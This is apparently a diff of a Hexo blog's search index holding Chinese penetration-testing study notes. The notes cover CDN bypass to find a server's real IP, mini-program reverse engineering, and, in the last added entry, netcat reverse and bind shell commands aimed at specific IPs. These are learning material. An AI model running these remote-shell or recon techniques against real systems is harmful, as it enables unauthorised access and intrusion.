@@ -15,32 +15,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo网站搭建和命令</title>
-    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
-<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
-<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
-
-<ol>
-<li><p>WWW目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
-</li>
-<li><p>Blog目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
-</li>
-<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>网站搭建</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Markdown语法</title>
     <url>/2024/03/11/Markdown%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Markdown-官方教程"><a href="#Markdown-官方教程" class="headerlink" title="Markdown 官方教程"></a><a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown 官方教程</a></h2><table>
@@ -118,6 +92,32 @@
 ]]></content>
       <tags>
         <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo网站搭建和命令</title>
+    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
+<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
+<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
+
+<ol>
+<li><p>WWW目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
+</li>
+<li><p>Blog目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
+</li>
+<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>网站搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -867,59 +867,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CDN绕过&amp;业务部署&amp;漏洞回链&amp;接口探针&amp;全网扫描&amp;反向邮件</title>
-    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B916/</url>
-    <content><![CDATA[<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>1.传统访问：用户访问域名 -&gt; 真实服务器IP -&gt; 访问目标主机<br>2.普通CDN：用户访问域名 -&gt; CDN节点 -&gt; 真实服务器IP -&gt; 访问目标主机<br>3.带WAF的CDN：用户访问域名 -&gt; CDN节点（WAF） -&gt; 真实服务器IP -&gt; 访问目标主机</p>
-<p>国内服务商：<br>阿里云  百度云  七牛云<br>又拍云 腾讯云  Ucloud<br>360  网宿科技 ChinaCache</p>
-<p>国外服务商：<br>CloudFlare StackPath Fastly<br>Akamai CloudFront Edgecast<br>CDNetworks Google Cloud CDN<br>CacheFly Keycdn Udomain CDN77</p>
-<p>CDN配置：</p>
-<ol>
-<li><p>加速域名-需要启用加速的域名<br>子域名获取真实IP，有一点可信度，但不是绝对性的，需要继续测试多个子域名<br><a href="http://www.baidu.com加速了/">www.baidu.com加速了</a><br>bbs.baidu.com没加速，获得真实IP<br>baidu.com没加速，获得真实IP</p>
-</li>
-<li><p>加速区域-需要启用加速的地区<br>国外访问获取真实IP（加速区域没有勾选全球）</p>
-</li>
-<li><p>加速类型-需要启用加速的资源<br>获得真实IP后找备案号，看看和真实IP对不对得上</p>
-</li>
-</ol>
-<p>针对腾讯和阿里云的服务器IP优先，需要自己判断</p>
-<p>常见方法：<br>子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间<br>通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
-<p>Ping网站：<br><a href="https://boce.aliyun.com/detect/">aliyun国外请求</a><br><a href="https://github.com/boy-hack/w8fuckcdn">w8fuckcdn</a><br><a href="https://github.com/Pluto-123/Bypass_cdn">Bypass_cdn</a></p>
-<p><a href="https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ">总和非常全的</a></p>
-<br>
-
-<h2 id="CDN服务-识别-绑定访问"><a href="#CDN服务-识别-绑定访问" class="headerlink" title="CDN服务-识别&amp;绑定访问"></a>CDN服务-识别&amp;绑定访问</h2><p><a href="http://www.17ce.com/">17ce Ping</a><br><a href="https://ping.chinaz.com/">chinaz 超级Ping</a></p>
-<p>各地ping（出现多个IP即启用CDN服务）<br>后置：绑定HOST访问解析（参考基础课CDN安全影响）</p>
-<p>CDN绕过-主动漏洞&amp;遗留文件<br>配置加速选项中只加速主域名，导致其他子域名未加速（解析IP可能同IP也可能C段）<br><a href="https://get-site-ip.com/">get-site-ip 查询IP接口</a><br><a href="https://fofa.info/extensions/source">fofa 查询IP接口</a>（针对国外CDN厂商）<br>使用网络空间&amp;第三方功能集合查询判断</p>
-<ol>
-<li>漏洞如：SSRF RCE等<br>利用漏洞，让对方真实服务器主动出网连接我，就可以得到真实IP</li>
-<li>遗留文件：配置性的文件，例如PHPINFO类似代码功能<br>通过访问类似PHPINFO类似代码，会获取本地IP造成地址泄漏例如”SERVER_ADDR”</li>
-</ol>
-<p>CDN绕过-邮件系统<br>判断条件：发信人是当前域名邮件用户名，邮件系统是作不了CDN的<br>让他主动给你发：<br>部署架设的邮件服务器如果向外部用户发送邮件的话，那么邮件头部的源码中会包含此邮件服务器的真实IP地址，有些就不行，没用自己的邮件系统发的就不行，例如有的用的126网易163网易的就不行，因为别人是注册了网易的邮件给你发的，探测的是网易的邮箱IP</p>
-<p>常见的邮件触发点有：</p>
-<ol>
-<li>RSS订阅</li>
-<li>邮箱注册、激活</li>
-<li>邮箱找回密码</li>
-<li>产品更新的邮件推送</li>
-<li>某业务执行后发送的邮件通知</li>
-<li>员工邮箱、邮件管理平台等入口的忘记密码</li>
-</ol>
-<p>或者你可以主动给未知邮箱发：（需要自己的邮件服务器不能第三方例如QQ，需要自己搭建邮件系统），有点骚，但是没别人给你发好用。</p>
-<p>通过发送邮件给个不存在的邮箱地址，因为该用户邮箱不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知。</p>
-<p>CDN绕过-全网扫描</p>
-<ol>
-<li>判断CDN加速厂商，先看国内的还是国外的</li>
-<li>利用厂商去IP库来筛地址网段</li>
-<li>然后配置，进行范围扫描<br>FUCK CDN工具的扫描流程：先从IP段去扫描符合开放端口，再从IP去访问看看关键字，将符合结果进行保存！</li>
-</ol>
-<p>加速厂商查询：<br><a href="https://tools.ipip.net/cdn.php">ipip 国外请求</a></p>
-<p>IP库工具项目：<br><a href="https://www.cz88.net/geo-public">纯真IP社区库</a><br><a href="https://github.com/Tai7sy/fuckcdn">FUCK CDN</a></p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
     <title>语言框架&amp;开发组件&amp;FastJson&amp;Shiro&amp;Log4j&amp;SpringBoot等</title>
     <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B917/</url>
     <content><![CDATA[<h2 id="重点知识-框架-Web-前端-后端"><a href="#重点知识-框架-Web-前端-后端" class="headerlink" title="重点知识-框架&amp;Web&amp;前端&amp;后端"></a>重点知识-框架&amp;Web&amp;前端&amp;后端</h2><p>框架：<br>简单代码的一个整合库，如果使用框架就只需要学习使用如何调用框架即可<br>例如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用就可以了<br>影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制<br>组件：第三方的功能模块（日志记录，数据监控，数据转换等）</p>
@@ -1016,6 +963,125 @@
 <li><p>动态调试从表现中提取数据<br>优点：没有误报，解决不能抓包不能代理等情况<br>优点；搞逆向的人能看到实时的app调用链等<br>缺点：无法做到完整</p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小程序应用&amp;解包反编译&amp;动态调试&amp;抓包&amp;静态分析&amp;源码架构</title>
+    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B919/</url>
+    <content><![CDATA[<h2 id="小程序获取-各大平台-关键字搜索"><a href="#小程序获取-各大平台-关键字搜索" class="headerlink" title="小程序获取-各大平台&amp;关键字搜索"></a>小程序获取-各大平台&amp;关键字搜索</h2><p>微信<br>百度<br>支付宝<br>抖音头条<br><br></p>
+<h2 id="小程序体验-凡科建站-模版测试上线"><a href="#小程序体验-凡科建站-模版测试上线" class="headerlink" title="小程序体验-凡科建站&amp;模版测试上线"></a>小程序体验-凡科建站&amp;模版测试上线</h2><p>测试小程序：<a href="https://qz.fkw.com/">https://qz.fkw.com/</a><br>参考：<a href="https://blog.csdn.net/qq_52445443/article/details/122351865">https://blog.csdn.net/qq_52445443/article/details/122351865</a></p>
+<ol>
+<li><p>主体结构<br>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。<br>一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>必需</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>app.js</td>
+<td>是</td>
+<td>小程序逻辑</td>
+</tr>
+<tr>
+<td>app.json</td>
+<td>是</td>
+<td>小程序公共配置</td>
+</tr>
+<tr>
+<td>app.wxss</td>
+<td>否</td>
+<td>小程序公共样式表</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>一个小程序页面由四个文件组成，分别是:     </p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>xxx.js</td>
+<td>页面逻辑</td>
+</tr>
+<tr>
+<td>xxx.json</td>
+<td>页面配置</td>
+</tr>
+<tr>
+<td>xxx.wxml</td>
+<td>页面结构</td>
+</tr>
+<tr>
+<td>xxx.wxss</td>
+<td>页面样式</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>项目整体目录结构</p>
+<table>
+<thead>
+<tr>
+<th>文件&#x2F;文件夹</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pages</td>
+<td>页面文件夹</td>
+</tr>
+<tr>
+<td>pages\index</td>
+<td>首页</td>
+</tr>
+<tr>
+<td>pages\logs</td>
+<td>日志</td>
+</tr>
+<tr>
+<td>pages\utils</td>
+<td></td>
+</tr>
+<tr>
+<td>pages\util</td>
+<td>工具类 (可以建立一个叫<code>api</code>的工具类)</td>
+</tr>
+<tr>
+<td>app.js</td>
+<td>入口js文件，类似于Java类中的main方法，全局js文件</td>
+</tr>
+<tr>
+<td>app.json</td>
+<td>全局配置文件</td>
+</tr>
+<tr>
+<td>app.wxss</td>
+<td>全局样式文件</td>
+</tr>
+<tr>
+<td>project.config.json</td>
+<td>与您在详情中勾选的配置相同</td>
+</tr>
+<tr>
+<td>sitemap.json</td>
+<td>用于配置小程序及其页面是否允许被微信索引</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<br>
+
+<h2 id="小程序抓包-Proxifier-BurpSuite联动"><a href="#小程序抓包-Proxifier-BurpSuite联动" class="headerlink" title="小程序抓包-Proxifier&amp;BurpSuite联动"></a>小程序抓包-Proxifier&amp;BurpSuite联动</h2><p>对抓到的IP或域名进行Web安全测试<br>对抓到的IP或域名进行API安全测试<br>对抓到的IP或域名进行端口服务测试<br><br></p>
+<h2 id="小程序逆向-解包反编译-动态调试-架构"><a href="#小程序逆向-解包反编译-动态调试-架构" class="headerlink" title="小程序逆向-解包反编译&amp;动态调试&amp;架构"></a>小程序逆向-解包反编译&amp;动态调试&amp;架构</h2><p>对源码架构进行分析<br>更多的资产信息<br>敏感的配置信息<br>未授权访问测试<br>源码中的安全问题<br><br></p>
+<h2 id="小程序多功能组手"><a href="#小程序多功能组手" class="headerlink" title="小程序多功能组手"></a>小程序多功能组手</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">微信官方开发工具</a><br>复杂操作复现：<a href="https://www.cnblogs.com/oodcloud/p/16964878.html">https://www.cnblogs.com/oodcloud/p/16964878.html</a><br>简单工具复现：<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a></p>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -1190,6 +1256,59 @@
       </categories>
   </entry>
   <entry>
+    <title>CDN绕过&amp;业务部署&amp;漏洞回链&amp;接口探针&amp;全网扫描&amp;反向邮件</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B916/</url>
+    <content><![CDATA[<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>1.传统访问：用户访问域名 -&gt; 真实服务器IP -&gt; 访问目标主机<br>2.普通CDN：用户访问域名 -&gt; CDN节点 -&gt; 真实服务器IP -&gt; 访问目标主机<br>3.带WAF的CDN：用户访问域名 -&gt; CDN节点（WAF） -&gt; 真实服务器IP -&gt; 访问目标主机</p>
+<p>国内服务商：<br>阿里云  百度云  七牛云<br>又拍云 腾讯云  Ucloud<br>360  网宿科技 ChinaCache</p>
+<p>国外服务商：<br>CloudFlare StackPath Fastly<br>Akamai CloudFront Edgecast<br>CDNetworks Google Cloud CDN<br>CacheFly Keycdn Udomain CDN77</p>
+<p>CDN配置：</p>
+<ol>
+<li><p>加速域名-需要启用加速的域名<br>子域名获取真实IP，有一点可信度，但不是绝对性的，需要继续测试多个子域名<br><a href="http://www.baidu.com加速了/">www.baidu.com加速了</a><br>bbs.baidu.com没加速，获得真实IP<br>baidu.com没加速，获得真实IP</p>
+</li>
+<li><p>加速区域-需要启用加速的地区<br>国外访问获取真实IP（加速区域没有勾选全球）</p>
+</li>
+<li><p>加速类型-需要启用加速的资源<br>获得真实IP后找备案号，看看和真实IP对不对得上</p>
+</li>
+</ol>
+<p>针对腾讯和阿里云的服务器IP优先，需要自己判断</p>
+<p>常见方法：<br>子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间<br>通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
+<p>Ping网站：<br><a href="https://boce.aliyun.com/detect/">aliyun国外请求</a><br><a href="https://github.com/boy-hack/w8fuckcdn">w8fuckcdn</a><br><a href="https://github.com/Pluto-123/Bypass_cdn">Bypass_cdn</a></p>
+<p><a href="https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ">总和非常全的</a></p>
+<br>
+
+<h2 id="CDN服务-识别-绑定访问"><a href="#CDN服务-识别-绑定访问" class="headerlink" title="CDN服务-识别&amp;绑定访问"></a>CDN服务-识别&amp;绑定访问</h2><p><a href="http://www.17ce.com/">17ce Ping</a><br><a href="https://ping.chinaz.com/">chinaz 超级Ping</a></p>
+<p>各地ping（出现多个IP即启用CDN服务）<br>后置：绑定HOST访问解析（参考基础课CDN安全影响）</p>
+<p>CDN绕过-主动漏洞&amp;遗留文件<br>配置加速选项中只加速主域名，导致其他子域名未加速（解析IP可能同IP也可能C段）<br><a href="https://get-site-ip.com/">get-site-ip 查询IP接口</a><br><a href="https://fofa.info/extensions/source">fofa 查询IP接口</a>（针对国外CDN厂商）<br>使用网络空间&amp;第三方功能集合查询判断</p>
+<ol>
+<li>漏洞如：SSRF RCE等<br>利用漏洞，让对方真实服务器主动出网连接我，就可以得到真实IP</li>
+<li>遗留文件：配置性的文件，例如PHPINFO类似代码功能<br>通过访问类似PHPINFO类似代码，会获取本地IP造成地址泄漏例如”SERVER_ADDR”</li>
+</ol>
+<p>CDN绕过-邮件系统<br>判断条件：发信人是当前域名邮件用户名，邮件系统是作不了CDN的<br>让他主动给你发：<br>部署架设的邮件服务器如果向外部用户发送邮件的话，那么邮件头部的源码中会包含此邮件服务器的真实IP地址，有些就不行，没用自己的邮件系统发的就不行，例如有的用的126网易163网易的就不行，因为别人是注册了网易的邮件给你发的，探测的是网易的邮箱IP</p>
+<p>常见的邮件触发点有：</p>
+<ol>
+<li>RSS订阅</li>
+<li>邮箱注册、激活</li>
+<li>邮箱找回密码</li>
+<li>产品更新的邮件推送</li>
+<li>某业务执行后发送的邮件通知</li>
+<li>员工邮箱、邮件管理平台等入口的忘记密码</li>
+</ol>
+<p>或者你可以主动给未知邮箱发：（需要自己的邮件服务器不能第三方例如QQ，需要自己搭建邮件系统），有点骚，但是没别人给你发好用。</p>
+<p>通过发送邮件给个不存在的邮箱地址，因为该用户邮箱不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知。</p>
+<p>CDN绕过-全网扫描</p>
+<ol>
+<li>判断CDN加速厂商，先看国内的还是国外的</li>
+<li>利用厂商去IP库来筛地址网段</li>
+<li>然后配置，进行范围扫描<br>FUCK CDN工具的扫描流程：先从IP段去扫描符合开放端口，再从IP去访问看看关键字，将符合结果进行保存！</li>
+</ol>
+<p>加速厂商查询：<br><a href="https://tools.ipip.net/cdn.php">ipip 国外请求</a></p>
+<p>IP库工具项目：<br><a href="https://www.cz88.net/geo-public">纯真IP社区库</a><br><a href="https://github.com/Tai7sy/fuckcdn">FUCK CDN</a></p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
     <title>HTTP数据包&amp;Postman构造&amp;请求方法&amp;请求头修改&amp;状态码判断</title>
     <url>/2024/03/10/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A810/</url>
     <content><![CDATA[<h2 id="数据-方法-头部-状态码"><a href="#数据-方法-头部-状态码" class="headerlink" title="数据-方法&amp;头部&amp;状态码"></a>数据-方法&amp;头部&amp;状态码</h2><p>get：向特定资源发出请求（请求指定页面信息，并返回实体主体）<br>post：向指定资源提交数据进行处理请求（提交表单、上传文件），又可能导致新的资源的建立或原有资源的修改<br>head：与服务器索与get请求一致的相应，响应体不会返回，获取包含在小消息头中的原信息（与get请求类似，返回的响应中没有具体内容，用于获取报头）<br>put：向指定资源位置上上传其最新内容（从客户端向服务器传送的数据取代指定文档的内容），与post的区别是put为幂等，post为非幂等<br>trace：回显服务器收到的请求，用于测试和诊断。trace是http8种请求方式之中最安全的<br>delete：请求服务器删除request-URL所标示的资源（请求服务器删除页面）<br>option：返回服务器针对特定资源所支持的HTML请求方法 或web服务器发送测试服务器功能（允许客户端查看服务器性能）<br>connect：HTTP&#x2F;1.1协议中能够将连接改为管道方式的代理服务器</p>
@@ -1298,125 +1417,6 @@
       </categories>
   </entry>
   <entry>
-    <title>小程序应用&amp;解包反编译&amp;动态调试&amp;抓包&amp;静态分析&amp;源码架构</title>
-    <url>/2024/03/11/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B919/</url>
-    <content><![CDATA[<h2 id="小程序获取-各大平台-关键字搜索"><a href="#小程序获取-各大平台-关键字搜索" class="headerlink" title="小程序获取-各大平台&amp;关键字搜索"></a>小程序获取-各大平台&amp;关键字搜索</h2><p>微信<br>百度<br>支付宝<br>抖音头条<br><br></p>
-<h2 id="小程序体验-凡科建站-模版测试上线"><a href="#小程序体验-凡科建站-模版测试上线" class="headerlink" title="小程序体验-凡科建站&amp;模版测试上线"></a>小程序体验-凡科建站&amp;模版测试上线</h2><p>测试小程序：<a href="https://qz.fkw.com/">https://qz.fkw.com/</a><br>参考：<a href="https://blog.csdn.net/qq_52445443/article/details/122351865">https://blog.csdn.net/qq_52445443/article/details/122351865</a></p>
-<ol>
-<li><p>主体结构<br>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。<br>一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：</p>
-<table>
-<thead>
-<tr>
-<th>文件</th>
-<th>必需</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>app.js</td>
-<td>是</td>
-<td>小程序逻辑</td>
-</tr>
-<tr>
-<td>app.json</td>
-<td>是</td>
-<td>小程序公共配置</td>
-</tr>
-<tr>
-<td>app.wxss</td>
-<td>否</td>
-<td>小程序公共样式表</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>一个小程序页面由四个文件组成，分别是:     </p>
-<table>
-<thead>
-<tr>
-<th>文件</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>xxx.js</td>
-<td>页面逻辑</td>
-</tr>
-<tr>
-<td>xxx.json</td>
-<td>页面配置</td>
-</tr>
-<tr>
-<td>xxx.wxml</td>
-<td>页面结构</td>
-</tr>
-<tr>
-<td>xxx.wxss</td>
-<td>页面样式</td>
-</tr>
-</tbody></table>
-</li>
-<li><p>项目整体目录结构</p>
-<table>
-<thead>
-<tr>
-<th>文件&#x2F;文件夹</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>pages</td>
-<td>页面文件夹</td>
-</tr>
-<tr>
-<td>pages\index</td>
-<td>首页</td>
-</tr>
-<tr>
-<td>pages\logs</td>
-<td>日志</td>
-</tr>
-<tr>
-<td>pages\utils</td>
-<td></td>
-</tr>
-<tr>
-<td>pages\util</td>
-<td>工具类 (可以建立一个叫<code>api</code>的工具类)</td>
-</tr>
-<tr>
-<td>app.js</td>
-<td>入口js文件，类似于Java类中的main方法，全局js文件</td>
-</tr>
-<tr>
-<td>app.json</td>
-<td>全局配置文件</td>
-</tr>
-<tr>
-<td>app.wxss</td>
-<td>全局样式文件</td>
-</tr>
-<tr>
-<td>project.config.json</td>
-<td>与您在详情中勾选的配置相同</td>
-</tr>
-<tr>
-<td>sitemap.json</td>
-<td>用于配置小程序及其页面是否允许被微信索引</td>
-</tr>
-</tbody></table>
-</li>
-</ol>
-<br>
-
-<h2 id="小程序抓包-Proxifier-BurpSuite联动"><a href="#小程序抓包-Proxifier-BurpSuite联动" class="headerlink" title="小程序抓包-Proxifier&amp;BurpSuite联动"></a>小程序抓包-Proxifier&amp;BurpSuite联动</h2><p>对抓到的IP或域名进行Web安全测试<br>对抓到的IP或域名进行API安全测试<br>对抓到的IP或域名进行端口服务测试<br><br></p>
-<h2 id="小程序逆向-解包反编译-动态调试-架构"><a href="#小程序逆向-解包反编译-动态调试-架构" class="headerlink" title="小程序逆向-解包反编译&amp;动态调试&amp;架构"></a>小程序逆向-解包反编译&amp;动态调试&amp;架构</h2><p>对源码架构进行分析<br>更多的资产信息<br>敏感的配置信息<br>未授权访问测试<br>源码中的安全问题<br><br></p>
-<h2 id="小程序多功能组手"><a href="#小程序多功能组手" class="headerlink" title="小程序多功能组手"></a>小程序多功能组手</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">微信官方开发工具</a><br>复杂操作复现：<a href="https://www.cnblogs.com/oodcloud/p/16964878.html">https://www.cnblogs.com/oodcloud/p/16964878.html</a><br>简单工具复现：<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a></p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</title>
     <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A82/</url>
     <content><![CDATA[<h2 id="Web常规化搭建："><a href="#Web常规化搭建：" class="headerlink" title="Web常规化搭建："></a>Web常规化搭建：</h2><p>原理：源码数据都在同服务器<br>影响：无，常规安全测试手法<br><br></p>
@@ -1486,6 +1486,64 @@
 <p>原理：通过反向代理转发真实服务达到访问目的<br>影响：访问目标只是一个代理，非真实应用服务器<br>注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！<br><br></p>
 <h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>原理：分摊到多个服务器来支撑服务，共同完成工作任务，一台服务器崩了还有备份<br>影响：有多个服务器加载服务，测试过程中存在多个目标情况</p>
 ]]></content>
+      <categories>
+        <category>基础入门</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>反弹SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</title>
+    <url>/2024/03/09/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A85/</url>
+    <content><![CDATA[<h2 id="常规基本渗透详解"><a href="#常规基本渗透详解" class="headerlink" title="常规基本渗透详解"></a>常规基本渗透详解</h2><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">渗透测试常用命令</a><br><a href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语</a><br><br></p>
+<h2 id="1：文件上传下载-解决无图形化-解决数据传输"><a href="#1：文件上传下载-解决无图形化-解决数据传输" class="headerlink" title="1：文件上传下载-解决无图形化&amp;解决数据传输"></a>1：文件上传下载-解决无图形化&amp;解决数据传输</h2><p><a href="https://forum.ywhack.com/bountytips.php?download">文件下载命令生成</a><br>Linux：wget curl python ruby perl java等<br>Windows：powershell citsadmin msiexec等<br><br></p>
+<h2 id="2：反弹Shell命令-解决数据回显-解决数据通讯"><a href="#2：反弹Shell命令-解决数据回显-解决数据通讯" class="headerlink" title="2：反弹Shell命令-解决数据回显&amp;解决数据通讯"></a>2：反弹Shell命令-解决数据回显&amp;解决数据通讯</h2><p><a href="https://forum.ywhack.com/shell.php">反弹Shell命令生成</a><br>正向连接：我主动连接，对方本地监听，就是正向，（只要是主动出去的都是正向）<br>反向连接：对方主动给出去，我本地监听（找内网，只能反向）</p>
+<p>Windows（得注意看谁控制谁先）<br>把cmd放到5566端口（L控W）：nc -e cmd -lvp 5566<br>主动连接对方5566端口（W控L）：nc 8.208.101.45 5566</p>
+<p>主动把cmd放到对方5566端口（L控W）：nc -e cmd 8.208.101.45 5566<br>监听5566端口（W控L）：nc -lvp 5566<br><br></p>
+<p>Linux（得注意看谁控制谁先）<br>主动连接对方5566端口（L控W）：ncat 8.208.28.234 5566<br>把SH放到5566端口（W控L）：ncat -e &#x2F;bin&#x2F;sh -lvp 5566</p>
+<p>监听5566连接（L控W）：ncat -lvp 5566<br>主动把SH放到对方5566端口（W控L）：ncat -e &#x2F;bin&#x2F;sh 8.208.28.234 5566<br><br></p>
+<h2 id="3：防火墙绕过-正向连接-反向连接-内网服务器"><a href="#3：防火墙绕过-正向连接-反向连接-内网服务器" class="headerlink" title="3：防火墙绕过- 正向连接&amp;反向连接&amp;内网服务器"></a>3：防火墙绕过- 正向连接&amp;反向连接&amp;内网服务器</h2><p>Windows管道符：<br>| （将左边命令的输出作为右边命令的输入）<br>&amp;（执行左边的命令，然后执行右边的命令，不考虑左边命令的成功或失败）<br>||（只有当左边的命令失败执行后，才会执行右边的命令）<br>&amp;&amp;（只有当左边的命令成功执行后，才会执行右边的命令）</p>
+<p>Linux管道符：<br>; （执行左边的命令，然后执行右边的命令，不考虑左边命令的成功或失败）<br>| （将一个命令的输出作为另一个命令的输入）<br>|| （只有当左边的命令失败执行后，才会执行右边的命令。）<br>&amp; （在后台执行命令，不会阻塞当前的 shell）<br>&amp;&amp; （只有当左边的命令成功执行后，才会执行右边的命令）<br>&#96;&#96;（命令替换。执行括在其中的命令，并将其输出替换到原位置）<br><br></p>
